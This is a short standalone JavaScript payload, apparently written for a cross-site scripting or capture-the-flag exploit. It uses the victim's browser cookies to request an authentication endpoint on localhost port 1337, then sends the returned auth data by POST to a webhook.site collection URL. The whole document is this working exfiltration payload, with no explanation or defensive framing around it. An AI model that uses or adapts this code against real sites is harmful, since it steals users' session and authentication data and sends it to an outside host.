(async () => {
  try {
    const res = await fetch('http://127.0.0.1:1337/api/auth', {
      credentials: 'include' 
    });
    const data = await res.json();

    await fetch('https://webhook.site/71cb4101-ffd8-43b3-a5ae-8b4e06dfc9d4', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ authResponse: data })
    });
  } catch (err) {
    console.error('Request failed:', err);
  }
})();
